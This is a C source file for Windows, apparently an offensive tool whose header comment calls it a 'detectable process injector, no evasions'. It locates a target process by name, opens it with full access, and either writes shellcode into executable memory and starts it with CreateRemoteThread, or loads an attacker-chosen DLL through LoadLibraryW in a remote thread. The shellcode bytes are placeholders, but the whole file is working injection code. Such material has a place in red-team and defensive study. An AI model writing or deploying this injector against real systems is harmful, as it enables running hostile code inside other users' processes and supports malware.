#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <tlhelp32.h>
#include <tchar.h>


/*
Author: c4she
Desc:   detectable process injector, no evasions
*/


unsigned char j4ckpot[] = "\xde\xad\xbe\xef\xde\xad\xbe\xef"
                          "\xde\xad\xbe\xef\xde\xad\xbe\xef"
                          "\xde\xad\xbe\xef\xde\xad\xbe\xef"
                          "\xde\xad\xbe\xef\xde\xad\xbe\xef"
                          "\xde\xad\xbe\xef\xde\xad\xbe\xef"
                          "\xde\xad\xbe\xef\xde\xad\xbe\xef"
                          "\xde\xad\xbe\xef\xde\xad\xbe\xef";


DWORD GetProcessIdByName(LPCTSTR processName);
HANDLE PIDtoHANDLE(DWORD PID);
int memInjection(HANDLE hProc);
int dllInjection(HANDLE hProc);

wchar_t dllPath[MAX_PATH] = L"";
DWORD PID, TID = 0;
HANDLE hProc, hThread = NULL;
LPVOID rBuff = NULL;
HMODULE hKernel32 = NULL;



int main(int argc, char *argv[]) {

    printf("\n");

    if (argc<2){
        printf("\n[-] Error, usage: %s <proc name> <dll path>\n", argv[0]);
        printf("    If no dll is specified, will default to mem injection\n\n");
        return 1;
    }


    BOOL mem = TRUE;
    if (argc >2){
        printf("[+] Injecting %s", argv[2]);
        mem = FALSE;
        mbstowcs(dllPath, argv[2], MAX_PATH);
    }

    // Get PID
    PID = GetProcessIdByName(argv[1]);
    if (PID == 0){
        printf("\n[-] Error, could not find PID of process. Ensure \"%s\" is running.\n", argv[1]);
        return 1;
    }
    printf("\n[+] Found PID : %lu\n", PID);


    // Get handle
    hProc = PIDtoHANDLE(PID);
    if (hProc == NULL){
        printf("\n[-] Error, failed to get a handle on proccess (%lu).\n", PID);
        return 1;
    }
    printf("[+] Got a handle to (%lu) : 0x%p\n", PID,hProc);


    // Either perform memory or dll injection
    int statcode=0;

    if (mem==TRUE){
        statcode=memInjection(hProc);
    } else {
        statcode=dllInjection(hProc);
    }

    if (statcode != 0){
        return 1;
    }

    return 0;
}



int memInjection(HANDLE hProc){

    // Allocate buffer inside proc memspace
    rBuff = VirtualAllocEx(hProc, NULL, sizeof(j4ckpot), (MEM_COMMIT|MEM_RESERVE), PAGE_EXECUTE_READWRITE);

    if (rBuff == NULL){
        printf("\n[-] Error, failed to allocate memory to 0x%p.\n", hProc);
        return 1;
    }
    printf("[+] Allocated memory to 0x%p.\n", hProc);



    // Write payload to proc mem
    int w = WriteProcessMemory(hProc, rBuff, j4ckpot, sizeof(j4ckpot), NULL);
    if (w == 0){
        printf("\n[-] Error, failed to write memory to 0x%p.\n", hProc);
        return 1;
    }
    printf("[+] Wrote %d byte(s) of shellcode to 0x%p!\n", sizeof(j4ckpot),hProc);


    // Execute payload via new thread
    hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)rBuff, NULL, 0, &TID);
    if (hThread == NULL){
        printf("\n[-] Error, failed to start thread\n");
        printf("\n%d\n", GetLastError());
        CloseHandle(hProc);
        return 1;
    }
    printf("[!] Payload run inside thread 0x%p!.\n", hThread);

    WaitForSingleObject(hThread, INFINITE);

    printf("[+] Waiting for thread to finish executing...\n");


    CloseHandle(hProc);
    CloseHandle(hThread);

    printf("\n[+] Cleaned up and exited successfully.\n");


    return 0;
}



int dllInjection(HANDLE hProc){

    wprintf(L"%ls\n",dllPath);
    // Allocate buffer inside proc memspace
    rBuff = VirtualAllocEx(hProc, NULL, sizeof(dllPath), (MEM_COMMIT|MEM_RESERVE), PAGE_READWRITE);

    if (rBuff == NULL){
        printf("\n[-] Error, failed to allocate memory to 0x%p.\n", hProc);
        return 1;
    }
    printf("[+] Allocated memory to 0x%p.\n", hProc);

    // Write dll path to proc mem
    int w = WriteProcessMemory(hProc, rBuff, dllPath, sizeof(dllPath), NULL);
    if (w == 0){
        printf("\n[-] Error, failed to write dll path to 0x%p.\n", hProc);
        return 1;
    }
    printf("[+] Wrote dll path to 0x%p!\n",hProc);


    hKernel32 = GetModuleHandleW(L"Kernel32");

    if (hKernel32==NULL){
        printf("\n[-] Error, failed to invoke Kernel32.dll\n");
        CloseHandle(hProc);
        return 1;
    }
    printf("[+] Invoked Kernel32.dll at : 0x%p\n", hKernel32);

    LPTHREAD_START_ROUTINE startroutine = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryW");

    // invoke user dll in new thread
    hThread = CreateRemoteThread(hProc, NULL, 0, startroutine, rBuff, 0, &TID);
    if (hThread == NULL){
        printf("\n[-] Error, failed to start thread\n");
        CloseHandle(hProc);
        return 1;
    }
    printf("[!] Dll invoked inside thread 0x%p!.\n", hThread);

    WaitForSingleObject(hThread, INFINITE);

    printf("[+] Waiting for thread to finish executing...\n");


    CloseHandle(hProc);
    CloseHandle(hThread);

    printf("\n[+] Cleaned up and exited successfully.\n");


    return 0;
}



HANDLE PIDtoHANDLE(DWORD PID){
    HANDLE hProcess = NULL;

    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);

    return hProcess;
}



DWORD GetProcessIdByName(LPCTSTR processName) {
    DWORD processID = 0;
    HANDLE hProcessSnap;
    PROCESSENTRY32 pe32;

    // Take a snapshot of all processes in the system.
    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        return 0;
    }

    // Initialize the PROCESSENTRY32 structure.
    pe32.dwSize = sizeof(PROCESSENTRY32);

    // Retrieve information about the first process.
    if (!Process32First(hProcessSnap, &pe32)) {
        CloseHandle(hProcessSnap); // Clean the snapshot object.
        return 0;
    }

    // Now walk the snapshot of processes.
    do {
        if (_tcsicmp(pe32.szExeFile, processName) == 0) {
            processID = pe32.th32ProcessID;
            break;
        }
    } while (Process32Next(hProcessSnap, &pe32));

    CloseHandle(hProcessSnap);
    return processID;
}

